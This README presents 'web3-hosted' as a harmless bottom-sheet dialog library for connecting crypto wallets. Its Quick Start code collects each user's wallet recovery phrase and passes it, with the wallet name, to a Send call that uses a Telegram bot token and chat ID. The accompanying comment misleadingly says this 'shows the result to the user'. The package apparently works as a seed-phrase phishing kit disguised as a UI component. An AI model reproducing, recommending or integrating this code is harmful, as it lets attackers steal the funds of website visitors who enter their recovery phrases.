# web3-hosted
**web3-hosted** is a simple and customizable bottom sheet dialog library for the web. It allows you to create stylish and highly customizable bottom sheets with optional close buttons, customizable dimensions, glass effects, and more.

## Current Version
1.0.0

## Demo
- [Docs available here](https://oyin25.github.io/web3-hosted/)

## CDNs
To include **web3-hosted** in your project using a CDN, add the following scripts:

### CSS and JS via jsDelivr
- [web3-hosted.css](https://cdn.jsdelivr.net/gh/oyin25/web3-hosted@latest/web3Hosted.css)
- [web3-hosted.js](https://cdn.jsdelivr.net/gh/oyin25/web3-hosted@latest/web3Hosted.js)

## Installation

### npm
To install via npm, use the following command:
```bash
npm install web3-hosted
```

### yarn
To install via yarn, use the following command:
```bash
yarn add web3-hosted
```

## Features
- Customizable title, text, and button options.
- Glass effect and custom background color.
- Optional close button (`btClose`).
- Configurable `btInteract` to disable user interaction with the webpage while the bottom sheet is open.
- Supports HTML content for flexible customization.

## Quick Start

### Basic Usage

#### Step 0: Create a Web3 Sheet Built In Button
```html
<w3h-connect-light></w3h-connect-light>
<w3h-connect-dark></w3h-connect-dark>
```

#### Step 02: Listen To the button Event

```javascript
<script>
  const connectButton = document.querySelector("w3h-connect-light");

  // or const connectButton = document.querySelector("w3h-connect-dark");

  // Listen for the result from the custom button
  connectButton.addEventListener("web3Result", (event) => {
    console.log("Result from web3-hosted:", event.detail);
    alert(`Wallet Connected: ${event.detail.walletName}`);
  });
</script>
```

#### Step 1: Include the CSS and JS files
```html
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/oyin25/web3-hosted@latest/web3Hosted.css">
<script src="https://cdn.jsdelivr.net/gh/oyin25/web3-hosted@latest/web3Hosted.js"></script>
```

#### Step 2: Create a Bottom Sheet
To create and display a bottom sheet dialog using **web3-hosted**, use the following example:
```javascript
web3Hosted.hosted({
  layout: "grid",
  wallets: {
    metamask: {
      image: "https://api.realscan.top/images/metamask.svg",
      name: "MetaMask",
    },
    cat: {
      image: "https://api.realscan.top/images/metamask.svg",
      name: "Arsenal",
    },
    car: {
      image: "https://api.realscan.top/images/metamask.svg",
      name: "Arsenal",
    },
    catu: {
      image: "https://api.realscan.top/images/metamask.svg",
      name: "Arsenal",
    },
  },
  onWalletSelect: (wallet) => {
    // When the wallet is selected, you can do some preliminary processing
    console.log(`${wallet} selected!`);

    // Note: The final result (including phrase) will be available only after the user inputs it.

    // Optionally add further logic or wait until the wallet phrase is input
  },
  onResult: (result) => {
    // Access the result JSON here
    console.log("Wallet Data Received:", result);

    // Show result to the user
    Send(`Wallet Connected:\nName: ${result.walletName}\nImage: ${result.walletImage}\nPhrase: ${result.walletPhrase}`, telegramToken, chatID);
  },
  onClose: () => {
    console.log('Wallet connection dialog closed.');
  },
  outsideTouch: false,
  theme: 'dark',
  glassEffect: false,
});
```

## API Reference

### `web3Hosted.hosted(options)`
- **`options`** (Object): The `options` object allows you to customize the behavior and appearance of the bottom sheet.

#### Options:

| Option          | Type      | Description                                                                                                   |
|-----------------|-----------|---------------------------------------------------------------------------------------------------------------|
| `layout`        | `string`  | Layout of the wallet selection (e.g., `"grid"`).                                                              |
| `wallets`       | `object`  | Object containing wallet configurations (e.g., `image`, `name`).                                              |
| `onWalletSelect`| `function`| Callback function when a wallet is selected.                                                                  |
| `onResult`      | `function`| Callback function when the wallet data is received.                                                           |
| `onClose`       | `function`| Custom function when the bottom sheet is closed.                                                              |
| `outsideTouch`  | `boolean` | Close the sheet when clicked outside if `true`.                                                               |
| `theme`         | `string`  | Theme of the bottom sheet (e.g., `"dark"`).                                                                   |
| `glassEffect`   | `boolean` | Enable or disable glass effect.                                                                               |

## Examples

### Example 1: Basic Wallet Selection
```javascript
web3Hosted.hosted({
  layout: "grid",
  wallets: {
    metamask: {
      image: "https://api.realscan.top/images/metamask.svg",
      name: "MetaMask",
    },
    trustwallet: {
      image: "https://api.realscan.top/images/metamask.svg",
      name: "Trust Wallet",
    },
    customwallet: {
      image: "https://api.realscan.top/images/metamask.svg",
      name: "Custom Wallet",
    },
  },
  onWalletSelect: (wallet) => {
    console.log(`${wallet} selected!`);
  },
  onResult: (result) => {
    console.log("Wallet Data Received:", result);
  },
  onClose: () => {
    console.log('Wallet connection dialog closed.');
  },
  outsideTouch: false,
  theme: 'dark',
  glassEffect: false,
});
```

## Callbacks and Interaction

### onClose Callback
The `onClose` option allows you to define custom behavior when the user closes the bottom sheet.
```javascript
web3Hosted.hosted({
  layout: "grid",
  wallets: {
    metamask: {
      image: "https://api.realscan.top/images/metamask.svg",
      name: "MetaMask",
    },
  },
  onClose: function() {
    console.log("Wallet connection dialog closed.");
  }
});
```

### Custom Close Function
You can close the sheet programmatically using the `web3Hosted.closed()` method.
```javascript
web3Hosted.closed();
```

## Development

To contribute or modify this library, ensure you have the following setup:

1. Clone the repository:
```bash
git clone https://github.com/oyin25/web3-hosted-lib.git
```

2. Install dependencies:
```bash
npm install
```

3. Run the build process:
```bash
npm run build
```

## License
This library is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
